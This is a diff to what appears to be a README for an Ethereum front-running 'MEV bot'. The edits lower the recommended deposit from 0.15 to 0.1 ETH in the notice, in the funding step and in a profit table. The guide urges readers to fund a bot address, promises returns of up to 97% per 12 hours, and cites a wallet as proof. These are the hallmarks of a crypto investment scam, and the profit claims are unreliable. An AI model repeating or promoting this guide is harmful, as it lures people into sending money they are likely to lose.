@@ -1,8 +1,8 @@
 🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨
 
-Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.1 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
+Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.05 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
 
-To avoid this, I recommend funding your contract with at least 0.15 ETH and up to 5 ETH to ensure the bot functions optimally.
+To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 5 ETH to ensure the bot functions optimally.
 
 Step-by-Step Setup Guide:
 
@@ -42,7 +42,7 @@ Note: Ensure your contract name is correctly selected in the CONTRACT section be
 
 7- Fund Your Bot
 
-► Deposit at least 0.15 ETH to cover slippage and ensure effective front-running.
+► Deposit at least 0.1 ETH to cover slippage and ensure effective front-running.
 
 ► Transfer the funds to your specific bot address.
 
@@ -57,7 +57,7 @@ Following these steps will help ensure a successful bot operation with minimized
 
 📈 Estimated Profits
 
-<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.15 ETH - 0.5 ETH</td><td>Low</td><td>Up to 10%</td></tr><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>
+<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.1 ETH - 0.5 ETH</td><td>Low</td><td>Up to 10%</td></tr><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>
 
 🔥 My running mev bot, used 5 ETH. Averaging about 1-3 ETH per day!
 [0x8c05FE0f7bc2f1C15Fecb2198242E4FD85961E08](https://etherscan.io/address/0x8c05FE0f7bc2f1C15Fecb2198242E4FD85961E08#internaltx)
